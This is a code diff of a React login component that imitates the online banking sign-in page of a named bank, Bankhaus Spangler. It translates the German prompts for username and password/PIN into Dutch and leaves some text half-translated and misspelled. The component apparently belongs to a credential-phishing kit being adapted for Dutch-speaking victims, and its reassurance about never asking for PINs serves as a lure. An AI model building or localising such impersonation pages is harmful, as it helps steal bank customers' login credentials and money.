@@ -52,7 +52,7 @@ export function BankhausSpangler({ formData, onChange, handleRouteAction, saving
           
           {/* Intro Text */}
           <p className="text-[#333] text-[14px] leading-relaxed mb-6">
-            Hier können Sie sich für Ihr neues Online Banking anmelden. Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner anderen Seite eingeben und diese geheim halten. Wir werden Sie nie nach Ihrer PIN oder einer TAN fragen!
+            Hier kunt u inloggen op uw internetbankieren. Tijdens het inloggen wordt een beveiligde verbinding opgezet. Let op dat u uw inloggegevens nergens anders invoert en deze geheim houdt. Wij zullen u nooit om uw PIN of TAN vragen!
           </p>
 
           {/* Checkbox Demo Area */}
@@ -73,7 +73,7 @@ export function BankhausSpangler({ formData, onChange, handleRouteAction, saving
             
             <div className="flex justify-between items-end mb-1">
               <label className="text-[#888] text-[13px]">
-                {step === 1 ? "Benutzername" : "Passwort / PIN"}
+                {step === 1 ? "Gebruikersnaam" : "Wachtwoord / PIN"}
               </label>
               <div className="text-[#998675] text-[13px]">
                 <a href="#" className="hover:underline">Hochkontrast</a>
@@ -134,10 +134,10 @@ export function BankhausSpangler({ formData, onChange, handleRouteAction, saving
           {/* Footer Links inside card */}
           <div className="flex flex-col items-center gap-1.5 mt-8 border-b border-[#e5e5e5] pb-6 mb-6">
             <a href="#" className="text-[#998675] text-[14px] hover:underline">
-              Benutzernamen vergessen?
+              Gebruikersnaamn vergessen?
             </a>
             <a href="#" className="text-[#998675] text-[14px] hover:underline">
-              Passwort vergessen?
+              Wachtwoord vergessen?
             </a>
           </div>
 
